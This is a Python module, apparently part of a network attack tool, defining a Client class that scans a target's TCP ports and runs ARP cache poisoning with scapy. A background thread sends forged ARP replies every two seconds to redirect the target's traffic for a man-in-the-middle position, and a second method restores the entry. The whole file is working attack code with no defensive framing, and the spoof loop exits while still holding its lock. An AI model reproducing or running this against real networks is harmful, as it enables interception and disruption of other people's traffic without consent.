import socket
import ssl
import scapy.all as scapy
from threading import Thread, Lock, Semaphore
import time

from .logger import Logger

from .port import Port

class Client():

    def __init__(self, ip : str, mac : str = None, logger = Logger()):
        self.__ip = ip
        self.__mac = mac
        self.__logger = logger
        self.__spoofs = {}
        self.__lock = Lock()
        self.__semaphore = None
        self.__num_handshakes = 0
        self.__time = 0
    
    def __str__(self):
        return f"Client [{self.__ip}] {self.__mac}"

    def get_ip(self):
        return self.__ip

    def get_mac(self):
        return self.__mac

    def scan_port(self, port:int):
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((self.__ip, port))
            self.__logger.log(f"Port {port} is open")
            return Port(s, self.__ip)
        except (ConnectionRefusedError, TimeoutError):
            return None

    def __spoof(self, client):
        if client in self.__spoofs:
            self.__logger.log(f"client {client.get_mac()} already spoofed", self.__logger.Level.FAIL)
            return
        self.__spoofs[client] = True
        packet = scapy.ARP(op=2, pdst=self.__ip, hwdst=self.__mac, psrc=client.get_ip())
        while(True):
            self.__lock.acquire()
            if(client not in self.__spoofs):
                break
            self.__logger.log(f"sending packet {packet.summary()}", self.__logger.Level.INFO)
            scapy.send(packet, verbose=False)
            self.__lock.release()
            time.sleep(2)

    def spoof(self, client):
        if self.__mac == None:
            self.__logger.log(f"Can't Spoof Client Outside of Ethernet", self.__logger.Level.FAIL)
            return
        t = Thread(target=self.__spoof, args=[client])
        t.start()

    def unspoof(self, client):
        if self.__mac == None:
            self.__logger.log(f"Can't Unspoof Client Outside of Ethernet", self.__logger.Level.FAIL)
            return
        if client not in self.__spoofs:
            self.__logger.log(f"client {client.get_mac()} not spoofed", self.__logger.Level.FAIL)
            return
        
        self.__lock.acquire()
        self.__spoofs.pop(client)
        # Forge ARP Response with op=2 (1 = request, 2 = response)
        packet = scapy.ARP(op=2, pdst=self.__ip, hwdst=self.__mac, psrc=client.get_ip(), hwsrc=client.get_mac())
        scapy.send(packet, verbose=False)
        self.__logger.log(f"sending packet {packet.summary()}", self.__logger.Level.INFO)
        self.__lock.release()